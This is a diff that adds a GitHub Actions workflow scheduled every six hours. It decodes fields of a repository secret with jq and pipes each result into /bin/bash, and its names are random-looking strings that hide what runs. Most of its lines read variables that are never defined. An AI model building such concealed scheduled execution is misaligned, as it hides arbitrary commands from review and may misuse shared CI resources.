@@ -1,0 +1,27 @@
+name: qianyuximing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianyuximing
+        env:
+          xvx7323: ${{ secrets.xvx7323 }}
+        run: |
+          echo $xvx7323 | jq -r .tuwpv27681 | /bin/bash
+          echo $brcc22 | jq -r .ijowz222 | /bin/bash
+          echo $yom36220 | jq -r .aptv5553 | /bin/bash
+          echo $vtqb0369 | jq -r .kj9 | /bin/bash
+          echo $z094 | jq -r .uqqck5 | /bin/bash
+          echo $emu165 | jq -r .xjxjy06 | /bin/bash
+          echo $ah77 | jq -r .qsbk535 | /bin/bash
+          echo $f40969 | jq -r .nltux44 | /bin/bash
+          echo $a67780 | jq -r .praa81962 | /bin/bash
+          echo $gxggm26 | jq -r .fee6 | /bin/bash
+
